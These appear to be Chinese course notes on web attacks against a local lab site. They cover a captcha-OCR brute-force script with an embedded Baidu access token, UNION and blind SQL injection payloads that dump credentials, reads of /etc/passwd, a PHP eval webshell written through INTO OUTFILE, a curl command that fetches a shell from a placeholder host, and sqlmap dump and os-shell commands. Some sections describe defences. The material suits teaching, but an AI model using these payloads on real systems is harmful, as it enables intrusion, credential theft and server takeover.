​	Session的生成过程，当用户第一次访问服务器时，如果请求中没有带Cookie字段，则服务器会在首次调用Session_start()的页面中响应一个Session ID，默认命名为PHPSESSID，响应的字段如下：

```java
Set-Cookie: PHPSESSID=rofavfpkrahu4aaos4ndgj5rr3; path=/		// 可以理解为系统自动生成的Cookie
```

​	接下来，后续的每一个请求，将会在请求头的Cookie字段中添加Session ID，目的是主动告诉服务器自己的身份

```php
Cookie: PHPSESSID=rofavfpkrahu4aaos4ndgj5rr3
```

​	另外，在服务器端也可以直接手工生成Cookie

```php
if (strtoupper($_COOKIE['vcode']) != strtoupper($vcode)){
    die("vcode-error");
}
```

> 由于Cookie是在客户端保存，所以服务器端利用Cookie进行验证码验证没有任何实际价值，Cookie的值完全由客户端的请求字段来决定。

## SQL注入-登录漏洞-验证码识别

### 一、使用机器学习识别验证码

​	利用Python，通过机器学习，不停地获取验证码图片，然后再对正确答案进行标注，让机器学习本张图片的正确答案和对应文字的样式。只要学习的数量足够多，识别率会高很多

```php
$type = $_GET['type'];
if ($type == 'vcode'){
    getCode();
}
elseif($type == 'text'){
    echo $_SESSION['vcode'];
}
```

> 上述代码中getCode用于生成验证码图片，如果发送请求为http://192.168.72.148/security/vocde.php?type=vcode，则显示验证码图片，如果请求为：http://192.168.72.148/security/vocde.php?type=text,则提供标注验证码

### 二 、基于百度API识别验证码

#### 1、API文档

[文字识别OCR (baidu.com)](https://cloud.baidu.com/doc/OCR/s/1k3h7y3db)

#### 2、**获取access_token示例代码**

[通用参考 - 鉴权认证机制 | 百度AI开放平台 (baidu.com)](https://ai.baidu.com/ai-doc/REFERENCE/Ck3dwjhhu)

![image-20220715120639484](https://yang-typora.oss-cn-beijing.aliyuncs.com/202207151206668.png)

### 三、使用百度API识别验证码

**百度在线获取access-token **

```bash
#!/bin/bash
curl -i -k 'https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&client_id=【百度云应用的AK】&client_secret=【百度云应用的SK】'
```

**调用百度的接口完成OCR识别**

```python
import requests, base64, time

'''
通用文字识别（高精度版）
'''


# 测试OCR识别结果
def baidu_ocr():
    request_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic"
    # 二进制方式打开图片文件
    f = open('D:/桌面/vocde.png', 'rb')
    img = base64.b64encode(f.read())

    params = {"image": img}
    access_token = '24.e040ac8e3e558a18c30e283ea21ae727.2592000.1660553456.282335-26712422'
    request_url = request_url + "?access_token=" + access_token
    headers = {'content-type': 'application/x-www-form-urlencoded'}
    response = requests.post(request_url, data=params, headers=headers)
    # print(response.text)


# 利用OCR实现爆破
```

### 四、基于Python进行爆破

```python
def burst_login(password):
    # 虽然百度接口可以直接读取验证码的URL地址，但是内网IP不可以访问
    # data={'url':'http://192.168.72.148/security/vocde.php'}
    session = requests.session()

    # 先获取验证码图片的二进制数据
    resp_vcode = session.get('http://192.168.72.148/security/vocde.php')
    img = base64.b64encode(resp_vcode.content)

    params = {"image": img}
    access_token = '24.e040ac8e3e558a18c30e283ea21ae727.2592000.1660553456.282335-26712422'
    baidu_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic"
    baidu_url = baidu_url + "?access_token=" + access_token
    headers = {'content-type': 'application/x-www-form-urlencoded'}
    resp_baidu = requests.post(baidu_url, data=params, headers=headers)
    vcode = '0000'
    if resp_baidu:
        vcode = resp_baidu.json()['words_result'][0]['words']
    # print(vcode)

    # 进行登录的爆破
    data = {'username': 'root', 'password': password, 'vcode': vcode}
    login_url = 'http://192.168.72.148/security/login-3.php'
    resp = session.post(url=login_url, data=data)
    if "vcode-error" in resp.text:
        # 直接将验证码出错时的密码输出，然后等本轮爆破完毕，再对验证码出错的密码单独爆破
        print(f'验证码出错:{data}')
    else:
        if ("login-fail" not in resp.text):
            print(f'登录成功，Payload为:{data}')


if __name__ == '__main__':

    with open('../top500.txt') as file:
        pass_list = file.readlines()
    for password in pass_list:
        burst_login(password.strip())
        time.sleep(2)
```

### 五、利用Burp进行爆破

Attack Type的四种类型

```
第一种：
Sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。
第二种：
Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中
第三种：
Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量
比如：username字典有500个，password字典有1000个，此时，username字典的第1个对应password字典的第1个，组成一一对应的关系，也就是说，最后爆破的次数是500次。
第四种：
Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。
比如：username字典有500个，password字典有1000个，此时每一个username都会遍历一遍所有的password，所以爆破次数是500*1000=50万次。
```

## SQL注入-登录漏洞 -登录次数限制防爆破

### 一、基本思路

​	在前述攻防对抗的过程中，我们从最开始编写一个简单的登录界面和后台功能开始，到发现SQL注入漏洞、万能验证码、爆破等漏洞开始，一路修改代码对漏洞进行防护，然后用新的手段进行破解，最后只剩下爆破一个漏洞。只要限制用户登录失败的次数，那么就可以从根本上防止暴力破解。

1. 需要在数据库中记录某个用户的登录失败的次数，每次登录失败，则+1
2. 需要在数据库中记录某个用户的最后一次登录时间，用于判断是否解除限制
3. 每一次登录时，都需要从数据库中取得这两个值，从而进行判断

### 二、技术准备

1. 核心的SQL语句操作

   ```sql
   同时更新两个字段并更新时间为现在：update user set failcount=failcount+1,lasttime=now() where userid=?
   比较两个时间的差值，单位可以是分或者秒等：select TIMESTAMPDIFF(MINUTE,lasttime,NOW())  FROM user WHERE userid=?
   ```

2. 在PHP中处理时间

   ```php
   PHP设置默认时区为中国：date_default_timezone_set("PRC");
   PHP生成年月日时分秒：echo date('Y-m-d H:i:s');
   PHP比较两个时间的差值（单位为秒）：
   $time1 = "2017-11-06 18:58:04";
   $time2 = "2017-11-06 18:58:09";
   echo (strtotime($time2)-strtotime($time1));
   ```

### 三、代码实现

```php
if ($stmt->num_rows == 1){
    $stmt->fetch();
    // 判断密码是否正确之前，先判断登录次数是否受限
    if ($failcount >= 3 && $timediff <= 60){
        die('user-locked');
    }

    if ($password == $password2){
        if ($failcount > 0){
            $sql = 'update user set failcount=0 where userid=?';
            $stmt = $conn->prepare($sql);
            $stmt->bind_param("i",$userid);
            $stmt->execute();
        }

        // echo "login-pass<br/>";
        // 登录成功后，记录SESSION变量

        $_SESSION['username'] = $username;
        $_SESSION['islogin'] = 'true';

        echo "<script>location.href='list.php'</script>";
    }
    else{
        $sql = 'update user set failcount=failcount+1,lasttime=now() where userid=?';
        $stmt = $conn->prepare($sql);
        $stmt->bind_param("i",$userid);
        $stmt->execute();

        echo "login-fail";
        
    }

}
```

## SQL注入-查询漏洞一

### 一、查询注入的数据类型

注入点根据可控参数的数据类型不同，可分为3类，分别是：

##### 1、数字型

```sql
select * from tables where id = 1;
```

##### 2、字符型

```sql
select * from tables where username = 'yang';
```

##### 3、搜索型

```sql
select * from tables where id like '%yang%';
```

##### 4、注释方式

数据类型不同，在注入的payload中会有大小不同，主要就是考察对字符语法规则的理解和注释符的运用。

```sql
#(%23), --空格(--+), /* */
```

### 二、注入步骤

**1、通过`and 1=1 and 1=2`的输入，来判断是否存在注入点。如果结果不一致，说明我们输入的语句被数据库执行了**

**2、通过观察或报错信息来判定注入点的类型**

- 数字型
- 字符型
- 搜索型

**3、使用`order by`来确定主查询数目。`order by`本质上是一个排序的语法，但是`order by`有一个条件，就是排序必须建立在正确的查询条数上。所以在注入中用`order by`并不是为了排序， 而是为了确认主查询的条数，确保`union select`的查询数与主查询一致。`order by`只会在超出主查询列数后才会报错，小于或者等于主查询数列不报错**

```sql
http://192.168.72.148/security/read.php?id=1 order by 6	#不报错说明列数正确
http://192.168.72.148/security/read.php?id=88 union select 1,2,3,4,5,6
```

 ![image-20220719191003896](https://yang-typora.oss-cn-beijing.aliyuncs.com/202207191910978.png)

> 代表回显行数是3和4

**4、使用`union select`查询，将主查询项改成符数或者不存在的数**

```sql
# union 联合查询的前提是：列数相等
http://192.168.72.148/security/read.php?id=88 union select 1,2,3,4,5,6
/security/read.php?id=88 union select 1,2,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),4,5,6
```

![image-20220719191441585](https://yang-typora.oss-cn-beijing.aliyuncs.com/202207191914653.png)

> 在能够回显的基础上，则可以做任意MySQL支持的查询，包括各种SQL语句和内置变量或函数的应用

**5、在显示的数字位置上，替换对应的查询语句，`database()、version?()、user()`**

```sql
# 可以直接查询数据表的内容，实现拖库，以下查询的前提是需要知道表名和列名
/security/read.php?id=88 union select 1,2, (select username from user limit 0,1) ,4,5,6

# 通过concat进行字符串拼接，可以一次性获取一行数据
/security/read.php?id=88 union select 1,2, (select concat (userid,'==',username,'==',password) from user limit 0,1) ,4,5,6
```

![image-20220719210741399](https://yang-typora.oss-cn-beijing.aliyuncs.com/202207192107464.png)

**6、使用`information_schema`进行所有内容查询，得知库名后首先查询表**

`table_shcema、schema_name`：数据库名称

`table_name`：表名

`column_name`：列名

```sql
http://192.168.72.148/security/read.php?id=88 union select 1,2, (select table_name from information_schema.tables where table_schema='learn' limit 1,1) ,4,5,6		#查询表名
```

**7、根据库名和表名查出所有的列名**

```sql
/security/read.php?id=88 union select 1,2, (select group_concat(column_name) from information_schema.columns where table_schema='learn'  and table_name='user') ,4,5,6
```

![image-20220719213503259](https://yang-typora.oss-cn-beijing.aliyuncs.com/202207192135316.png)

```sql
#也可查内置的mysql数据库中的参数、数据，比如user表
http://192.168.72.148/security/read.php?id=88 union select 1,2, (select  concat(User,'==',Password)  from mysql.user limit 0,1) ,4,5,6
```

![image-20220719214110685](https://yang-typora.oss-cn-beijing.aliyuncs.com/202207192141744.png)

**8、知道表名、列名，可以直接查出表的内容**

```sql
/security/read.php?id=88 union select 1,2, (select group_concat(password) from user) ,4,5,6
```

![image-20220719214244864](https://yang-typora.oss-cn-beijing.aliyuncs.com/202207192142918.png)

**9、使用`concat`连接列值，可以一次取出多列**

```sql
/security/read.php?id=88 union select 1,2, (select group_concat(username,':',password) from user) ,4,5,6
```

![image-20220719214437716](https://yang-typora.oss-cn-beijing.aliyuncs.com/202207192144768.png)

**10、如果查询出多列，只能显示一列，则可以使用`limit`**

```sql
http://192.168.72.148/security/read.php?id=88 union select 1,2, (select  concat(User,'==',Password)  from mysql.user limit 0,1) ,4,5,6		--0,1表示从第0行开始，取1列
```

### 三、进阶用法

**1、使用`concat_ws`指定分隔符，比`concat`更加方便**

```sql
/security/read.php?id=88 union select 1,2, (select concat_ws(':',username,password) from user) ,4,5,6
```

**2、使用`group_concat`和`concat_ws`连用**

```sql
/security/read.php?id=88 union select 1,2, (select group_concat(table_name) from information_schema.tables where table_schema='learn') ,4,5,6
```

> 在名为`information_schema`的数据库中的`tables`表中查询`table_schema(数据库名称)`为`leran`的数据，显示`table_name(表名)`

```sql
/security/read.php?id=88 union select 1,2, (select group_concat(concat_ws(':',username,password)) from user ) ,4,5,6
```

**3、使用十六进制代替单引号**

```sql
select hex('YikJiang')		--在MySQL中将字符串转换为16进制
select unhex('59696B4A69616E67')		--将十六进制转换回字符串		
```

**4、浏览所有数据库**

```sql
--方法一：
http://192.168.72.148/security/read.php?id=88 union select 1,2, (select group_concat(distinct(table_schema)) from information_schema.tables ) ,4,5,6	--distinct去重

--方法二：
/security/read.php?id=88 union select 1,2, (select group_concat(schema_name) from information_schema.schemata ) ,4,5,6
```

![image-20220720155420581](https://yang-typora.oss-cn-beijing.aliyuncs.com/202207201554668.png)

​		尝试访问：`/phpmyadmin`，如果认证方式为：`config`，则直接进入后台，如果使用认证方式为：`http`，则可以爆破，所以最好的方式是不开启PHPMyAdmin，或者在有需要的时候开启远程访问。

**修改`vim /opt/lampp/etc/extra/httpd-xampp.conf`**

```shell
<Directory "/opt/lampp/phpmyadmin">
    AllowOverride AuthConfig Limit
   	Require local		#允许本地登录
    #Require all granted	允许所有IP访问
    ErrorDocument 403 /error/XAMPP_FORBIDDEN.html.var
</Directory>
```

**5、获取`mysql.user`的用户名称密码，从而可以进行爆破**

```sql
security/read.php?id=88 union select 1,2, (select concat_ws(':',user,password) from mysql.user limit 0,1) ,4,5,6
```

**6、针对非数据型查询漏洞**

- 字符型

```
/security/read.php?id=88'  union select 1,2, (select concat_ws(':',user,password) from mysql.user limit 0,1) ,4,5,6 %23'
/security/read.php?id=88'  union select 1,2, (select concat_ws(':',user,password) from mysql.user limit 0,1) ,4,5,6 --+'
```

- 搜索型

```
select  * from article where content like '%路由%'；
select  * from article where content like '%路由%'--'%';
select  * from article where content like '%路由%'#'%';
```

> 上述注入均是GET请求，针对POST请求是完全一样的用法，只是将Payload移到Post请求的正文当中即可。

### 四、Union查询注入不适用的地方

1. 注入语句无法截断，且不清楚完整的SQL查询语句；
2. 页面不能返回查询信息的时候；
3. Web页面中有两个SQL查询语句，查询语句的列数不同。

### 五、防护方法

1. 添加`addslashes`
2. 将ID类数字型参数转换为整数
3. 

## 文件读写及木马植入

### 一、读写权限确认



![image-20220720164518951](https://yang-typora.oss-cn-beijing.aliyuncs.com/202207201645049.png)

```sql
show global variables like '%secure%';
查看MySQl全局变量的配置，当输入以上命令后，结果
secure_file_priv = 空的时候，任意读写
secure_file_priv = 某个路径的时候，只能在规定的那个路径下读写
secure_file_priv = NULL 表示不能读写
```

### 二、读取文件

​	利用SQL语句读取系统文件，先读取常规文件（明确路径），如果能成功读取，则继续读取其他文件。如果明确知道路径，则直接尝试爆破路径下的文件。

```python
http://192.168.72.148/security/read.php?id=88 union select 1,2,3,load_file("C:/windows/service.inf"),5,6
http://192.168.72.148/security/read.php?id=88 union select 1,2,3,load_file("/etc/passwd"),5,6
    
/security/read.php?id=88 union select 1,2,3,load_file("D:/XamppNew/htdocs/security/common.php"),5,6
/security/read.php?id=88 union select 1,2,3,load_file("/opt/lampp/htdocs/security/common.php"),5,6
```

### 三、写入木马

```php
//一句话木马
<?php @eval($_GET['yang']); ?>		// eval可以执行系统命令，@可以屏蔽报错
//eval可以将一段字符串当成代码来执行，如果用户可以直接将这段有效的PHP代码传入后台，则可以执行任意代码或指令

union select 1,2,3,"<?php eval($_POST['yang']);?>",5,6 into outfile "/opt/lampp/htdocs/security/hack.php"
```

## SQL注入-远程控制工具

### 一、中国菜刀

1、必须提前已经完成了木马植入然后才能使用。

2、木马必须是POST请求，参数自定义，在菜刀中给出正确的参数名。

> 是属于辅助工具，并且菜刀的传输过程是明文传输，目前已被WAF进行防护了

### 二、Behinder冰蟹

​		冰蝎是加密传输，防火墙很难分析出流量特征，比较容易绕开防火墙。所以需要先上传一个冰蝎自己的带加密解密功能的Shell脚本，这个上传Shell的过程通常有以下几种方法：

​	1、直接在命令行运行命令按行用`echo`写入

```
yang=system('echo "$post=file_get_contents("php://input");" >> /opt/lampp/htdocs/security/hack.php')
```

​	2、直接使用`curl`命令进行远程文件下载

```
yang=system("curl http://www.xxx.com/hack.php" > /opt/lampp/htdocs/security/temp/hcak.php)
```

​	3、先上传一句话木马，再用菜刀连接，然后基于菜刀直接上传Shell

​	4、如果目标站点存在文件上传漏洞，直接在文件上传的时候上传Shell。

## SQL注入-错误注入

### 一、Union注入不适用的地方

1. 注入语句无法截断，且不清楚完整的SQL查询语句；
2. 页面不能返回查询信息的时候；
3. Web页面中有两个SQL查询语句，查询语句的列数不同。

### 二、关于MySQL处理XML

#### 1、先准备以下XML文件内容

```xml
<class id="YikJiang">
    <student sequence="1">
        <id> 1 </id>
        <name>James</name>
        <sex>男</sex>
        <age>38</age>
        <school>lakers</school>
    </student>
    <student sequence="2">
        <id> 2 </id>
        <name>Curry</name>
        <sex>男</sex>
        <age>34</age>
        <school>Warriors</school>
    </student>    
```

#### 2、创建一张表，其中有一列的值为上述XML文件

`xmltable`为表名，`testxml`为列名，只有一行一列，值为上述XML文本

#### 3、执行以下SQL语句

```sql
-- 查询James
select extractvalue(testxml,'//student[@sequnence="1"]/name') from xmltable;
-- 将James修改为LeBron
update xmltable set tesexml = upadtexml(testxml,'//student[@sequnence="1"]/name',"<name>LeBron</name>");
```

### 三、报错注入

​	当`union select`出现不适用的情形下，我们通常使用报错来进行注入 

### 四、常用报错注入Payload

## SQL注入-盲注

盲注的使用场景：没有回显的时候

### 一、Boolean型盲注

​	Boolean是基于真假的判断（True or false）。不管输入什么，结果都只返回真或假两种情况。Boolean型盲注的关键在于通过表达式结果与已知值进行对比，根据对比结果判断正确与否。

​	盲注有时候需要一个一个字符去猜，因此一些字符串操作的函数经常被用到。

```shell
length():返回查询字符串的长度
mid(column_name,start,length):截取字符串
subsrt(string,start,length):截取字符串
Left(string,n):截取字符串
ORD():返回字符的ASCII码
ASCII():返回字符的ASCII码
```

Eg：

```
1 and length(database()) = 5
1 and length(database(),1,1) ='l' 如果正确响应结果，说明数据库的第1个字符是l
```

> 使用Burp进行遍历，获取正确的数据库名称

### 二、时间型盲注

​	Boolean盲注还是能通过页面返回的对错来判断，当页面任何信息都不返回的时候，就需要使用时间盲注了。时间盲注就是在布尔盲注的基础上，首先经过真假的判断，然后在真假判断上添加时间的判断

时间盲注所需函数大多与布尔相同。

```
length():返回查询字符串的长度
mid(column_name,start,length):截取字符串
subsrt(string,start,length):截取字符串
Left(string,n):截取字符串
ORD():返回字符的ASCII码
ASCII():返回字符的ASCII码
if():逻辑判断
sleep():控制时间
benchmark():控制时间
```

Eg：

```shell
?id=1 and if(length(database()) = 5,sleep(5),1)
?id=1 and if(sustr(database()) = 5,sleep(5),1)
```

Python脚本：

```python
import requests, time

for len in range(1, 50):
    start = time.time()
    header = {"cookie": "PHPSESSID=srb89pb85tbjmbokmao4c7uih4"}
    url = f"http://192.168.72.148/security/read.php?id=1 and if(length(database()) = {len},sleep(3.5),1)"
    resp = requests.get(url=url, headers=header)
    end = time.time()
    resptime = end - start
    if int(resptime) >= 3:
        print(f"数据库的长度为：{len}")
        break
```



## SQL注入-SQLMap工具

### 一、SQLMap拖库

​		SQLMap可以完成注入点的发现，数据库类型的确认，WebShell权限和路径的确认，拖库等一系列的功能。测试的Payload共分为5级：

Level 1 ~ Level 5，Level 1属于基础级，Payload相对较少，Level 5 属于最高级别， Payload很多。

**1、当我们发现注入点的时候**

```shell
sqlmap -u "http://192.168.72.148/security/read.php?id=1"
```

**2、查看所有的数据库**

```shell
sqlmap -u "http://192.168.72.148/security/read.php?id=1" --dbs
```

**3、查看当前使用的数据库**

```shell
sqlmap -u "http://192.168.72.148/security/read.php?id=1" --current-db
```

**4、发现使用的是Learn数据库，接下来对数据库进行查询**

```shell
sqlmap -u "http://192.168.72.148/security/read.php?id=1" --cookie="PHPSESSID=srb89pb85tbjmbokmao4c7uih4" -D "learn" --tables
```

**5、查出所有表后，对user表的列名进行查询**

```shell
sqlmap -u "http://192.168.72.148/security/read.php?id=1" --cookie="PHPSESSID=srb89pb85tbjmbokmao4c7uih4" -D "learn" -T "user" --columns
```

**6、users表中的列名已经知道了，可以直接查出所有的数据**

```shell
sqlmap -u "http://192.168.72.148/security/read.php?id=1" --cookie="PHPSESSID=srb89pb85tbjmbokmao4c7uih4" -D "learn" -T "user" -C "userid,username,password" --dump
```

> 完成拖库的操作后，可以在输出中查看到表的数据，也可以直接根据提示信息进入相应文件查看内容

**7、直接指定数据库类型，节省时间**

```shell
sqlmap -u "http://192.168.72.148/security/read.php?id=1" --cookie="PHPSESSID=srb89pb85tbjmbokmao4c7uih4" --dbms=mysql
```

**8、判断是否为DBA**

```shell
sqlmap -u "http://192.168.72.148/security/read.php?id=1" --cookie="PHPSESSID=srb89pb85tbjmbokmao4c7uih4" --dbms=mysql --is-dba
```

### 二、POST和Cookie

**1、如果某个注入点需要先登录，那么可以手工登录后，使用相同的Cookie进行处理**

```shell
sqlmap -u "http://192.168.72.148/security/read.php?id=1" --dbs
```

**2、如果注入点不是GET，而是POST请求，则要添加POST正文**

Ⅰ、先将POST请求在Burp中进行捕获，将请求内容保存到文件中

![image-20220724111927075](https://yang-typora.oss-cn-beijing.aliyuncs.com/202207241119151.png)

Ⅱ、通常POST请求正文内容如下

```
POST /security/read.php?id=1 HTTP/1.1
Host: 192.168.72.148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.72.148/security/read.php?id=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://192.168.72.148
Connection: close
Cookie: PHPSESSID=srb89pb85tbjmbokmao4c7uih4
Upgrade-Insecure-Requests: 1

username=root&password=123456&vcode=42ic&id=1
```

Ⅲ、运行SQLMap时，再通过`-r`参数指定文件，同时通过`-p`参数明确指定参数，实现注入

```shell
sqlmap -r sqlmap.txt -p id --cookie="PHPSESSID=srb89pb85tbjmbokmao4c7uih4" --dbs
```

> 由于URL地址已经在`sqlmap.txt`的请求内容中，所以不需要指定`-u`参数。如果不通过`-p`指定id参数，则SQLMap会对所有的参数进行注入测试。如`username=root&password=123456&vcode=42ic&id=1`，此处四个参数都会被尝试。

### 三、OS-Shell

#### 1、整个过程分为三个部分

Ⅰ、猜测网站绝对路径

Ⅱ、尝试写入木马

Ⅲ、获取到Shell命令行

```shell
sqlmap -u "http://192.168.72.148/security/read.php?id=1" --cookie="PHPSESSID=srb89pb85tbjmbokmao4c7uih4" --dbms=mysql --os-shell
```

#### 2、手工读写文件

```shell
# 读写远程服务器上的文件
sqlmap -u "http://192.168.72.148/security/read.php?id=1" --cookie="PHPSESSID=srb89pb85tbjmbokmao4c7uih4" --dbms=mysql --file-read

# 当SQL不能自动完成木马植入时，可以使用此命令进行手工植入
sqlmap -u "http://192.168.72.148/security/read.php?id=1" --cookie="PHPSESSID=srb89pb85tbjmbokmao4c7uih4" --dbms=mysql --file-write ./hack.php --file-dest /opt/lampp/htodcs/security/temp/hcak.php

# 此时，也可以使用Python调用sqlmap的命令(os.popen("").read())进行盲猜，循环遍历目录字典文件。
sqlmap -u "http://192.168.72.148/security/read.php?id=1" --cookie="PHPSESSID=srb89pb85tbjmbokmao4c7uih4" --dbms=mysql --os-shell --batch  
#--batch参数可以直接一次性运行完，SQLMap中途不会询问(非交互模式)，按照默认设置，适用于自动化
```

## SQL注入-其他注入

### 一、更新注入

​	所有更新类的操作，只返回布尔型的结果，并不会返回数据，所以无法向`Select`一样进行多样化的处理。所以更新类的操作的核心就是构造报错注入的Payload

### 二、堆叠注入

### 三、HTTP头注入

